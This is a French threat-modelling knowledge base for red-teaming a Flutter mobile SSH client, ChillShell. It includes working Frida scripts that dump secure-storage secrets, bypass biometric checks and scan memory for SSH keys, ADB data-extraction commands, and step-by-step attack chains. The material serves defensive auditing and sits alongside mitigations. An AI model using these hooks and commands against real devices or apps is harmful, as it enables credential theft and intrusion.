# Attaques Specifiques Mobile -- Base de connaissance offensive
# Skill : adversary-simulation | Fichier knowledge
# Plateformes : Android (API 21+), iOS (14+)
# Architecture cible : Mobile (ChillShell) -> Tailscale mesh -> Desktop Bridge -> PC cible

> **Source** : Extractions de CYBERSEC_MOBILE.md

---

## TABLE DES MATIERES

1. [Reverse engineering Flutter mobile](#1--reverse-engineering-flutter-mobile)
2. [Frida -- instrumentation dynamique](#2--frida--instrumentation-dynamique)
3. [Root/Jailbreak bypass](#3--rootjailbreak-bypass)
4. [ADB et debugging](#4--adb-et-debugging)
5. [Contournement biometrique](#5--contournement-biometrique)
6. [Screenshot et screen recording](#6--screenshot-et-screen-recording)
7. [Tapjacking (overlay attack)](#7--tapjacking-overlay-attack)
8. [Clipboard exposition](#8--clipboard-exposition)
9. [flutter_pty exploitation](#9--flutter_pty-exploitation)
10. [Service SSH persistant (foreground service)](#10--service-ssh-persistant)
11. [Juice Jacking / ChoiceJacking](#11--juice-jacking--choicejacking)
12. [Ingenierie sociale mobile](#12--ingenierie-sociale-mobile)
13. [Supply chain mobile (pub.dev)](#13--supply-chain-mobile)
14. [Attaques IA offensive contre mobile](#14--attaques-ia-offensive)
15. [Chaines d'attaque mobile](#15--chaines-dattaque-mobile)

---

## 1 -- Reverse engineering Flutter mobile

### Vulnerabilite (CWE-693)

Les binaires Flutter AOT (Ahead-of-Time) contiennent le code Dart compile. Sans obfuscation, les noms de classes, methodes et constantes sont extractibles.

### Outils

| Outil | Fonction | Complexite |
|-------|----------|-----------|
| **Blutter** | Analyse du snapshot AOT Dart, extrait symboles et constantes | Intermediaire |
| **reFlutter** | Patch le moteur Flutter pour desactiver TLS pinning et activer l'inspection | Intermediaire |
| **unflutter** | Decompile les snapshots Dart | Intermediaire |
| **Ghidra/IDA** | Desassemblage classique des binaires natifs | Expert |
| **jadx** | Decompileur Java/Kotlin (pour le code Android natif) | Script kiddie |
| **apktool** | Decompression/recompression d'APK | Script kiddie |

### Ce que l'attaquant peut extraire

- Noms de classes et methodes (sauf si `--obfuscate`)
- Constantes et chaines de caracteres (cles en dur, URLs, patterns)
- Structure de l'application (architecture, flux de donnees)
- Points d'integration natifs (Platform Channels)

### Scenario d'attaque

```bash
# 1. Extraire l'APK
adb pull /data/app/com.example.chillshell-1/base.apk

# 2. Decompresser
unzip base.apk -d chillshell_extracted/

# 3. Analyser avec Blutter
python3 blutter.py chillshell_extracted/lib/arm64-v8a/libapp.so

# 4. Rechercher des secrets
grep -rn "key\|secret\|token\|password\|api" blutter_output/
```

### Audit -- verifier l'obfuscation

```bash
grep -rn "obfuscate\|split-debug-info" --include="*.yaml" --include="*.gradle" .
```

**Source** : CYBERSEC_MOBILE.md section 12

---

## 2 -- Frida -- instrumentation dynamique

### Description

Frida est l'outil principal pour l'analyse dynamique des apps Flutter. Il permet de :
- Hooker des fonctions Dart/Java/ObjC en temps reel
- Modifier les valeurs de retour
- Intercepter les Platform Channels
- Dumper la memoire

### Scripts Frida pour ChillShell

#### 2.1 Hook flutter_secure_storage

```javascript
Java.perform(function() {
    var SecureStorage = Java.use(
      'com.it_nomads.fluttersecurestorage.FlutterSecureStorage'
    );
    SecureStorage.read.implementation = function(key) {
        var value = this.read(key);
        console.log('[SECURE_STORAGE] key=' + key + ' value=' + value);
        return value;
    };
});
```

#### 2.2 Hook local_auth (bypass biometrie)

```javascript
Java.perform(function() {
    var BiometricPrompt = Java.use(
      'androidx.biometric.BiometricPrompt$AuthenticationCallback'
    );
    BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {
        console.log('[BYPASS] Biometrie contournee');
        this.onAuthenticationSucceeded(result);
    };
});
```

#### 2.3 Interception Platform Channels

```javascript
Java.perform(function() {
    var MethodChannel = Java.use(
      'io.flutter.plugin.common.MethodChannel'
    );
    MethodChannel.invokeMethod.overload(
      'java.lang.String', 'java.lang.Object',
      'io.flutter.plugin.common.MethodChannel$Result'
    ).implementation = function(method, args, callback) {
        console.log('[CHANNEL] ' + method + ' args=' + JSON.stringify(args));
        return this.invokeMethod(method, args, callback);
    };
});
```

#### 2.4 Dump memoire -- recherche de cles SSH

```javascript
Memory.scan(Process.enumerateRanges('rw-')[0].base,
  Process.enumerateRanges('rw-')[0].size,
  "2d2d2d2d2d424547494e", // "-----BEGIN" en hex
  {
    onMatch: function(address, size) {
      console.log('[CLE SSH] ' + address);
      console.log(hexdump(address, { length: 2048 }));
    },
    onComplete: function() { console.log('Scan termine'); }
  }
);
```

### Detection anti-Frida

```bash
# Verifier si l'app detecte Frida
grep -rn "frida\|xposed\|substrate\|objection" --include="*.dart" --include="*.java" .
```

**Source** : CYBERSEC_MOBILE.md sections 4.3, 4.4, 12.3

---

## 3 -- Root/Jailbreak bypass

### Outils de root modernes

| Outil | Methode | Detection |
|-------|---------|-----------|
| **Magisk** | Systemless root, MagiskHide | Difficile a detecter |
| **KernelSU** | Root au niveau kernel | Tres difficile a detecter |
| **Zygisk** | Injection dans le processus Zygote | Difficile a detecter |

### Ce que le root permet

- Acces a `/data/data/<package>/` (toutes les donnees de l'app)
- Injection Frida sans restriction
- Lecture de la memoire de n'importe quel processus
- Modification des fichiers systeme
- Installation de keyloggers invisibles

### Audit

```bash
# Verifier la detection de root
grep -rn "isRooted\|isJailbroken\|root_check\|SafetyNet\|Play Integrity\|freeRASP" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md section 12.4

---

## 4 -- ADB et debugging

### Vulnerabilite (CWE-489)

Si le build release a `android:debuggable="true"` ou si le USB debugging est actif :

```bash
# Acces complet via ADB
adb shell run-as com.example.chillshell
cat /data/data/com.example.chillshell/shared_prefs/*.xml

# Backup complet
adb backup -apk -shared com.example.chillshell

# Installation d'un APK modifie
adb install -r chillshell_patched.apk
```

### Audit

```bash
grep -rn "debuggable\|android:debuggable" --include="*.xml" android/
```

**Source** : CYBERSEC_MOBILE.md section 4.10

---

## 5 -- Contournement biometrique

### Vulnerabilite

`local_auth` utilise `BiometricPrompt` (Android) / `LAContext` (iOS) comme simple gate UI. Pas de CryptoObject lie a la biometrie.

### Vecteurs de contournement

1. **Hook Frida** : forcer `onAuthenticationSucceeded` (voir section 2.2)
2. **Deepfake biometrique** : masques 3D ou videos deepfake haute fidelite (2026)
3. **Replication d'empreinte** : empreintes latentes sur l'ecran du telephone
4. **Bypass logiciel** : modification du binaire pour supprimer la verification

### Politique de re-authentification a verifier

- Biometrie AVANT chaque connexion SSH (pas juste au login)
- Re-auth apres inactivite
- Re-auth pour commandes dangereuses (`sudo`, `rm -rf`)
- Rate limiting : 5 tentatives -> 5 min -> 15 min -> 1 h
- 10 echecs consecutifs -> wipe des cles SSH

### Audit

```bash
grep -rn "local_auth\|authenticate\|biometric" --include="*.dart" .
grep -rn "CryptoObject\|setUserAuthenticationRequired" --include="*.java" --include="*.kt" android/
```

**Source** : CYBERSEC_MOBILE.md sections 6.4, 9.5

---

## 6 -- Screenshot et screen recording

### Vulnerabilite (CWE-200)

Sans `FLAG_SECURE`, les ecrans sensibles (cle SSH, terminal) peuvent etre captures :
- Screenshots par d'autres apps
- Screen recording (Accessibility Services malveillants)
- Screen mirroring (Miracast, ADB)

### Audit

```bash
grep -rn "FLAG_SECURE\|setFlags\|WindowManager.LayoutParams" --include="*.dart" --include="*.java" --include="*.kt" .
```

**Source** : CYBERSEC_MOBILE.md section 9.2

---

## 7 -- Tapjacking (overlay attack)

### Vulnerabilite (CWE-1021)

Une app malveillante affiche une couche transparente par-dessus l'app ChillShell. L'utilisateur croit interagir avec ChillShell mais ses touches sont capturees par la couche malveillante.

### Impact

- Capture du PIN/mot de passe de l'app
- Validation involontaire d'actions sensibles
- L'utilisateur ne voit pas l'overlay

### Audit

```bash
grep -rn "filterTouchesWhenObscured\|setFilterTouchesWhenObscured" --include="*.dart" --include="*.java" .
```

**Source** : CYBERSEC_MOBILE.md section 9.3

---

## 8 -- Clipboard exposition

### Vulnerabilite (CWE-200)

Le presse-papier Android est accessible a toutes les apps (avant Android 13). Meme apres Android 13, le nettoyage n'est pas garanti.

### Scenario d'attaque

L'utilisateur copie sa cle SSH ou un mot de passe -> une app malveillante en arriere-plan lit le clipboard.

### Audit

```bash
grep -rn "Clipboard\|clipboard\|copy\|paste" --include="*.dart" .
grep -rn "clearClipboard\|clipboardTimeout" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md section 4.9

---

## 9 -- flutter_pty exploitation

### Vulnerabilite

`flutter_pty ^0.4.2` fournit un pseudo-terminal natif sur Android. Il donne un **shell complet** sur le device.

### Risques

- Si l'attaquant accede au PTY (via une faille de l'app), il a un shell Android
- Les commandes executees dans le PTY ont les memes permissions que l'app
- Sur device roote, le PTY peut escalader les privileges

### Audit

```bash
grep -rn "flutter_pty\|PseudoTerminal\|pty" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md section 4.7

---

## 10 -- Service SSH persistant

### Vulnerabilite

`flutter_foreground_task ^9.2.0` maintient la session SSH **en permanence**. Implications :

- Les cles SSH restent en memoire tant que le service tourne
- Plus le service tourne, plus il y a de copies de la cle dans la heap (GC Dart)
- Le service est visible dans la barre de notification (attire l'attention)
- La batterie est consommee en permanence (utilisateur peut desactiver le service)

### Impact

- Fenetre d'attaque permanente pour l'extraction memoire
- Le service maintient la connexion SSH active = l'attaquant peut l'utiliser

### Audit

```bash
grep -rn "flutter_foreground_task\|foreground\|startForegroundTask" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md section 4.12

---

## 11 -- Juice Jacking / ChoiceJacking

### Vulnerabilite

Bornes de charge publiques et cables pieges (O.MG Cable, USBHarpoon).

**ChoiceJacking (2025)** : le chargeur malveillant simule des entrees tactiles pour approuver une connexion de donnees ADB.

```bash
# Si ADB est actif, l'attaquant a un acces COMPLET
adb shell
adb pull /data/data/com.example.chillshell/ /tmp/stolen/
adb backup -apk com.example.chillshell
```

### Contre-mesures OS

- Android 15+ : confirmation obligatoire pour ADB
- iOS : Trust dialog pour chaque connexion USB

**Source** : CYBERSEC_MOBILE.md section 7.4

---

## 12 -- Ingenierie sociale mobile

### Vecteurs

| Vecteur | Description | Impact |
|---------|------------|--------|
| Phishing SMS/email | Lien vers APK modifie | Installation de malware |
| "Prete-moi ton tel" | 5 min avec le PIN = extraction de tout | Vol de cles SSH |
| QR code malveillant | Redirection vers phishing ou APK | Installation de malware |
| Faux support technique | "Installez TeamViewer pour qu'on vous aide" | Acces a distance |
| Shoulder surfing | Observer le PIN/pattern | Acces physique |

### Impact specifique ChillShell

L'app controle un PC a distance. L'acces au telephone = acces au PC. L'enjeu est donc **plus eleve** qu'une app standard.

**Source** : CYBERSEC_MOBILE.md section 14

---

## 13 -- Supply chain mobile (pub.dev)

### Vulnerabilite

L'ecosysteme pub.dev est vulnerable au supply chain attack :

| Vecteur | Description |
|---------|------------|
| Typosquatting | `dartssh3`, `flutter_securre_storage` |
| Compromission de maintainer | Vol du compte pub.dev du maintainer |
| Dependance transitive | Une dependance de dartssh2 compromise |
| Build system | CI/CD compromis qui injecte du code |

### Dependances critiques de ChillShell

| Package | Version | Risque |
|---------|---------|--------|
| dartssh2 | ^2.13.0 | CRITIQUE -- aucun audit |
| flutter_secure_storage | ^10.0.0 | HAUTE -- stocke les cles SSH |
| pointycastle | ^3.7.3 | HAUTE -- operations crypto |
| cryptography | ^2.7.0 | HAUTE -- operations crypto |
| local_auth | ^3.0.0 | MOYENNE -- biometrie |

### Audit

```bash
# Verifier les versions dans pubspec.lock
grep -A2 "dartssh2\|flutter_secure_storage\|pointycastle\|cryptography\|local_auth" pubspec.lock
```

**Source** : CYBERSEC_MOBILE.md section 16

---

## 14 -- Attaques IA offensive

### Vecteurs 2026

| Attaque | Description | Complexite |
|---------|------------|-----------|
| Deepfake biometrique | Masques 3D, videos deepfake pour FaceID/TouchID | Expert |
| Fuzzing IA (dartssh2) | LLMs generent des payloads SSH malformes | Expert |
| Phishing IA | Emails/SMS ultra-personnalises generes par LLM | Intermediaire |
| Analyse comportementale | IA correle les patterns de trafic pour reconstruire les frappes | Expert |
| Xbow | Outil IA surpassant les chercheurs humains en bug bounty | Expert |

### Impact

L'IA democratise les attaques autrefois reservees aux experts et accelere la decouverte de zero-days.

**Source** : CYBERSEC_MOBILE.md section 6

---

## 15 -- Chaines d'attaque mobile

### Chaine 1 : Phishing + malware + extraction

```
SMS de phishing avec lien APK
  -> Installation de l'APK modifie (permissions identiques)
  -> Le malware tourne en parallele de ChillShell
  -> Il lit le clipboard (cle SSH copiee)
  -> Il capture les screenshots (terminal SSH)
  -> Exfiltration vers C2
```

### Chaine 2 : Root + Frida + compromission totale

```
Device roote (Magisk)
  -> Frida attache au processus ChillShell
  -> Hook flutter_secure_storage -> capture cle SSH
  -> Hook local_auth -> bypass biometrie
  -> Hook Platform Channels -> capture des commandes SSH
  -> L'attaquant a un miroir complet de l'activite SSH
```

### Chaine 3 : Evil Twin WiFi + pre-tunnel

```
Evil Twin WiFi (meme SSID que le WiFi habituel)
  -> Le telephone se connecte automatiquement
  -> L'attaquant capture le trafic AVANT le tunnel Tailscale
  -> Il intercepte les premiers paquets de negociation
  -> Combinaison avec Terrapin (CVE-2023-48795)
  -> Downgrade des algorithmes SSH
  -> MITM complet de la session
```

### Chaine 4 : ADB + ChoiceJacking

```
L'utilisateur branche son telephone a une borne de charge publique
  -> ChoiceJacking (2025) active ADB automatiquement
  -> adb backup de l'app ChillShell
  -> Extraction des SharedPreferences (hotes, IPs)
  -> Si allowBackup=true -> extraction des secrets
  -> L'attaquant connait les cibles SSH
```

### Chaine 5 : Ingenierie sociale + acces physique

```
"Prete-moi ton telephone 2 minutes"
  -> L'attaquant connait le PIN (shoulder surfing)
  -> Il ouvre ChillShell -> biometrie contournee (le vrai doigt)
  -> Il lance une commande SSH : ajout de sa cle dans authorized_keys
  -> Il rend le telephone
  -> Il a un acces SSH permanent au PC cible
```

---

## 16 -- Android 16 (API 36 "Baklava") -- Changements cassants

### 16.1 Foreground service -- Timeout 6h (CRITIQUE pour SSH)

Les services de type `dataSync` sont limites a **6 heures sur 24h** en arriere-plan. Apres ce delai, `Service.onTimeout()` est appele et le service DOIT s'arreter, sinon ANR (Application Not Responding).

**Consequence DIRECTE pour ChillShell** : Pour une app maintenant un tunnel SSH ou une connexion VPN persistante via `flutter_foreground_task`, c'est un **changement cassant**. Le service SSH en arriere-plan sera coupe apres 6h.

**Action** : Migration IMPERATIVE vers le type `connectedDevice` pour les connexions reseau longue duree.

**Quotas JobScheduler** : Les jobs demarres depuis un foreground service ne sont plus exemptes des quotas runtime.

### 16.2 Permission reseau local -- WOL directement affecte

Android 16 prepare l'introduction d'une permission `NEARBY_WIFI_DEVICES` obligatoire pour acceder aux appareils sur le reseau local. Actuellement traitee comme un "split permission" de `INTERNET` (auto-accordee), elle deviendra **explicitement requise sur Android 17+**.

**Impact Wake-on-LAN** : L'envoi de Magic Packets sur le LAN necessitera cette permission explicite.

**Impact Tailscale** : Le discovery Tailscale en reseau local sera aussi affecte.

### 16.3 Protection contre les fausses stations de base

Nouvelle section "Mobile network security" dans Safety Center. Le systeme notifie l'utilisateur quand l'appareil se connecte a un reseau non chiffre ou echange ses identifiants IMSI/IMEI de maniere suspecte.

**Limitation** : Necessite un modem compatible IRadio 3.0 -- aucun Pixel actuel ne le supporte.

### 16.4 Advanced Protection Mode

- Bloque l'acces USB aux donnees quand l'appareil est verrouille (contre Juice Jacking / ChoiceJacking)
- Empeche le sideloading
- Restreint les services d'accessibilite non verifies

**API** : `AdvancedProtectionManager` -- interrogeable pour adapter le comportement de l'app.

### 16.5 accessibilityDataSensitive flag

Nouveau flag pour proteger les ecrans contenant des donnees sensibles contre les services d'accessibilite malveillants.

**Action** : Appliquer ce flag sur les ecrans SSH, affichage de mots de passe, configuration de cles.

### 16.6 Alignement 16 Ko pages memoire

NDK r28 avec alignement 16 Ko obligatoire pour Android 15+. Toute bibliotheque native compilee avec un alignement 4 Ko **crashera**.

**Action** : Recompiler TOUTES les bibliotheques natives (dartssh2 FFI, flutter_secure_storage natif, etc.) avec NDK 27+.

### 16.7 Intent redirection hardening

Android 16 renforce la protection contre le detournement des deep links et intents. Tester les deep links de l'app pour s'assurer qu'ils ne sont pas detournables.

---

## 17 -- iOS 18.4 -- Restriction mprotect() (CASSE le debug Flutter)

### Impact critique sur le developpement

Le mode debug Flutter utilise la compilation JIT via la Dart VM, qui necessite de basculer dynamiquement les permissions memoire RX→RW. iOS 18.4+ **bloque ces appels** meme avec l'entitlement developpeur `get-task-allow`.

**Resultat** : **Crash au demarrage en mode debug sur appareil physique iOS**. Hot reload impossible.

**Ce qui fonctionne encore** : Mode Release (AOT) non affecte. Simulateurs non affectes.

**Probleme specifique SSH/Tailscale** : Les Network Extensions sont impossibles a tester sur simulateur → **blocage majeur** pour le developpement.

**Suivi** : Dart SDK issue #60202 -- travaux en cours pour un workflow JIT-less.

**Impact pour les tests de securite** : Les tests sur iOS necessitent desormais le mode Release ou la virtualisation. Le debug Frida sur appareil physique iOS est aussi affecte.

---

## 18 -- iPhone 17 MIE (Memory Integrity Enforcement)

### 3 technologies combinees

**Date** : Annonce 9 septembre 2025, puces A19/A19 Pro

| Technologie | Description |
|-------------|-------------|
| **Allocateurs memoire types** | kalloc_type et xzone malloc -- chaque bloc memoire a un type defini |
| **Enhanced Memory Tagging Extension (EMTE)** | Mode synchrone -- chaque bloc porte un tag secret verifie par le hardware a CHAQUE acces |
| **Tag Confidentiality Enforcement** | Protection contre les attaques side-channel sur les tags |

### Comportement

Un tag incorrect provoque la **terminaison immediate du processus** -- aucune fenetre d'exploitation.

### Ce que MIE bloque

Buffer overflows, use-after-free, acces memoire non autorises. Protege meme la memoire globale non-taguee.

### Caracteristiques

Toujours actif, integre au silicium, NON desactivable.

### Impact Frida/jailbreak

Corellium affirme que "l'ere d'attente des jailbreaks pourrait etre revolue" sur les appareils MIE. Les techniques d'injection de code en memoire (Frida, hooks dynamiques) sont structurellement bloquees sur les appareils recents.

**Pour les apps tierces** : Activable via Xcode (fonctionnalite "Enhanced Security"). Le code natif des plugins Flutter beneficiera de la protection sur les appareils compatibles.

---

## 19 -- iOS 26 -- NEPacketTunnelProvider obligatoire

Apple recommande **fortement** la migration vers `NEPacketTunnelProvider` pour toute app VPN/Tailscale. Les autres methodes sont "hautement decouragees".

**Nouvelles APIs** : Network Extension ameliorees, filtrage d'appels on-device, Foundation Model Framework.

**Action** : Verifier que Tailscale utilise bien `NEPacketTunnelProvider` sur iOS.

---

## 20 -- dartssh2 2.13.0 -- Etat detaille

### 20.1 Vulnerabilite Terrapin confirmee (NON corrigee)

dartssh2 ne supporte PAS le Strict Key Exchange (RFC 9308). Vulnerable a l'attaque Terrapin (CVE-2023-48795) avec `chacha20-poly1305@openssh.com` ou les combinaisons CBC+ETM.

**Preuve** : dartssh2 n'apparait PAS dans la liste officielle des implementations ayant adopte strict KEX sur terrapin-attack.com.

**Impact** : Un MITM peut tronquer des messages en debut de canal chiffre, desactiver l'obfuscation du timing des frappes, potentiellement downgrader l'authentification.

**Mitigation** : Forcer `aes256-gcm@openssh.com` comme cipher -- il est immunise contre Terrapin.

### 20.2 Parametre dangereux : disableHostkeyVerification

**Nouveau en v2.13.0**. Supprime TOUTE verification de cle d'hote.

**Impact** : Ouvre la porte aux attaques MITM si active en production. Un attaquant peut se faire passer pour n'importe quel serveur SSH.

**Action** : INTERDIRE `disableHostkeyVerification` en production. Ajouter un lint / check CI.

### 20.3 2FA keyboard-interactive casse

**Issue #128** : Le support du 2FA via keyboard-interactive est casse. Empeche l'utilisation du 2FA SSH standard.

### 20.4 Ameliorations v2.13.0 (22 juin 2025)

- **Re-keying serveur** : Support du re-keying initie par le serveur. Important pour les sessions SSH longues.
- **Encrypt-then-MAC** : Support `hmac-sha2-256-etm@openssh.com` et `hmac-sha2-512-etm@openssh.com`.

### 20.5 Etat du projet

- **63 issues** ouvertes, **7 PR**, **1 contributeur** actif
- **8 mois** sans mise a jour (en fevrier 2026)
- **Aucun audit de securite** publie

### 20.6 Tableau des risques dartssh2

| Risque | Gravite | Statut |
|--------|---------|--------|
| Pas de Strict KEX (Terrapin) | CRITIQUE | Non corrige |
| `disableHostkeyVerification` | ELEVE | Nouveau en 2.13.0, a interdire |
| Maintenance ralentie (8 mois) | MOYEN | En cours |
| Aucun audit de securite | MOYEN | Permanent |
| 2FA keyboard-interactive casse | MOYEN | Issue #128 ouverte |
| Crypto basee sur pointycastle | MOYEN | Non FIPS |
| 63 issues, 7 PR, 1 contributeur | MOYEN | Bus factor = 1 |

### 20.7 Alternatives evaluees

- **dartssh2_plus** : Fork avec potentiellement des correctifs supplementaires
- **NoPorts (Atsign)** : Elimine le besoin de ports SSH ouverts mais depend lui-meme de dartssh2
- **libssh2 via FFI** : Alternative C, auditee, mais necessite un binding Dart complet. Plus viable sur desktop que mobile

**Conclusion** : Aucune alternative viable drop-in. dartssh2 est irreplacable pour Flutter multiplateforme.

---

## 21 -- Malware Flutter -- Details complementaires

### 21.1 FluHorse -- Campagne persistante

**Decouvert** : Check Point, mai 2023. **Statut 2026** : Campagne active et persistante. Nouvelles infrastructures chaque mois.

- **Cibles** : Taiwan (app ETC de peage), Vietnam (VPBank Neo), utilisateurs sinophones
- **Variante empaquetee** : Chiffre le payload en AES-128-CBC dans `classes.dex`. Dechiffrement natif via `libapksadfsalkwes.so`
- **Evasion** : Un echantillon est reste **non detecte sur VirusTotal pendant plus de 3 mois**

### 21.2 SpyLoan/MoneyMonger

**8 millions** d'installations. Prets predateurs avec extorsion. Utilise Flutter pour l'opacite du format binaire.

### 21.3 Autres familles

- **MobiDash** : Adware avec base SQL chiffree
- **TinstaPorn/SpyAgent** : Spyware adoptant Flutter en 2024

### 21.4 Lazarus/BlueNoroff macOS -- Premier malware Flutter etatique

**Decouvert** : Jamf Threat Labs, novembre 2024. Malware macOS deguise en jeu de demineur. Code Flutter contactant infrastructure DPRK connue. Applications **signees et notarisees par Apple** avant revocation.

**Premiere** : Premiere utilisation observee de Flutter par un acteur etatique. Confirmation que Flutter est un vecteur d'attaque multiplateforme au-dela du mobile Android.

### 21.5 Statistiques FrameWar (ActiveFence)

- **333 000** apps Flutter actives sur le Play Store
- **3,5 milliards** d'installations cumulees
- **24%** des nouvelles apps Google Play utilisent Flutter
- **20%** des nouvelles apps iOS utilisent Flutter

La masse critique rend la detection par signature du framework Flutter impossible sans faux positifs massifs.

---

## 22 -- Dart obfuscation stagne (3.7 a 3.11)

### Constat

Malgre 5 versions publiees entre fevrier 2025 et fevrier 2026, AUCUNE amelioration significative de l'obfuscation native.

**Ce que `--obfuscate` fait** : Uniquement le renommage de symboles.

**Ce qu'il NE fait PAS** :
- Les chaines de caracteres restent en clair
- Les URLs restent en clair
- Les cles API restent en clair
- Les noms d'enum ne sont pas obfusques
- Le flux de controle n'est pas modifie

**Citation Build38** : "Trop basique pour ajouter de la difficulte contre un attaquant"

---

## 23 -- GC Dart detaille -- Impact memoire sur mobile

### Mecanisme

1. Le **Young Space Scavenger** COPIE les objets vivants vers une autre zone memoire
2. Les copies residuelles restent dans l'ancienne zone
3. Les objets `String` sont **IMMUTABLES** -- impossible d'ecraser leur contenu
4. Le GC **NE MET PAS A ZERO** la memoire liberee
5. Le moment de la collecte est **NON DETERMINISTE**

**Resultat** : Un secret (cle SSH, token Tailscale, mot de passe) peut persister en MULTIPLES copies dans le heap Dart bien apres sa "suppression" logique.

### Mitigations imparfaites

- `Uint8List` + `fillRange(0, length, 0)` -- mais le GC peut avoir copie AVANT l'effacement
- Package `cryptography` -- classe `SecretKeyData` avec methode `destroy()`
- `dart:ffi` -- `malloc.allocate<Uint8>()` place les secrets HORS du controle du GC

**Manque critique** : Dart 3.7 a 3.11 n'a introduit AUCUNE API native de gestion securisee de la memoire.

---

## 24 -- dart:ffi -- Surface d'attaque non memoire-sure

`dart:ffi` est essentiellement un appel C en syntaxe Dart, NON memoire-sur. Risques :
- **use-after-free** : acces a un pointeur libere
- **double-free** : liberation multiple du meme pointeur
- **buffer overflow** : ecriture au-dela des limites allouees
- **dangling pointers** : pointeurs vers de la memoire invalide

Flutter ne genere PAS de stack canaries car Dart n'a pas de tableaux alloues sur la pile, mais le code C appele via FFI peut etre vulnerable.

**Position Google** : Considere les rapports a ce sujet comme des faux positifs des scanners.

---

## 25 -- Platform Channels -- Aucune validation par defaut

MethodChannel, EventChannel, BasicMessageChannel n'imposent **AUCUNE validation des entrees** par defaut.

**Amelioration** : Le package Pigeon (recommande par Flutter) genere des interfaces type-safe, mais son adoption est **optionnelle**. La majorite des apps n'utilisent pas Pigeon.

---

## Chaines d'attaque mobile (MISE A JOUR 2026)

### Chaine 6 : Android 16 timeout + perte de session SSH

```
Android 16 API 36 deploye sur le telephone
  -> Le foreground service SSH est de type dataSync
  -> Apres 6h de connexion, Service.onTimeout() est appele
  -> La session SSH est coupee brutalement
  -> Les cles de session ne sont pas nettoyees en memoire
  -> Si un attaquant a acces au heap (Frida/dump memoire)
  -> Il recupere les cles de session d'une connexion "terminee"
```

### Chaine 7 : iPhone 17 MIE + recours virtualisation pour tests

```
Test de securite sur iPhone 17 (puces A19 MIE)
  -> Frida physique BLOQUE par Memory Integrity Enforcement
  -> L'attaquant ne peut plus injecter de code en memoire
  -> Recours a la virtualisation (Corellium) pour les tests
  -> Ou ciblage des appareils pre-MIE (iPhone 16 et anterieurs)
  -> La protection ne couvre PAS tous les utilisateurs
```

### Chaine 8 : dartssh2 Terrapin + MITM sur mobile

```
Reseau WiFi hostile (Evil Twin ou WiFi public)
  -> MITM entre le telephone et le serveur SSH
  -> Exploitation Terrapin (CVE-2023-48795) car dartssh2 n'a pas Strict KEX
  -> Troncature de messages en debut de canal chiffre
  -> Desactivation de l'obfuscation du timing des frappes
  -> L'attaquant reconstruit les commandes tapees
  -> Capture des mots de passe sudo et commandes sensibles
```

---

## Sources

- CYBERSEC_MOBILE.md -- Sections 4, 5, 6, 7, 9, 12, 14, 16
- 1_COMPLEMENT_MOBILE_2026.md -- Complement recherche securite mobile (fevrier 2026)
- 2_COMPLEMENT_MOBILE_2_2026.md -- Complement #2 OS, framework, dartssh2 mobile (fevrier 2026)
- OWASP Mobile Top 10 (2024)
- OWASP MASTG-TECH-0112 : RE Flutter officialise
- MITRE ATT&CK Mobile
- CWE-693 : Protection Mechanism Failure
- CWE-489 : Active Debug Code
- CWE-200 : Exposure of Sensitive Information
- CWE-1021 : Improper Restriction of Rendered UI Layers
- dartssh2 GitHub : https://github.com/TerminalStudio/dartssh2 (63 issues, 7 PR, 1 contributeur)
- terrapin-attack.com : Liste des implementations avec Strict KEX
- Android 16 Developer Preview : https://developer.android.com/about/versions/16
- Apple MIE : Annonce septembre 2025, puces A19/A19 Pro
- iOS 18.4 mprotect() : Dart SDK issue #60202
- iOS 26 NEPacketTunnelProvider : Documentation Apple
- Check Point : FluHorse (mai 2023, campagne persistante 2026)
- Jamf Threat Labs : Lazarus/BlueNoroff Flutter macOS (novembre 2024)
- ActiveFence FrameWar : Rapport Flutter malware 2025
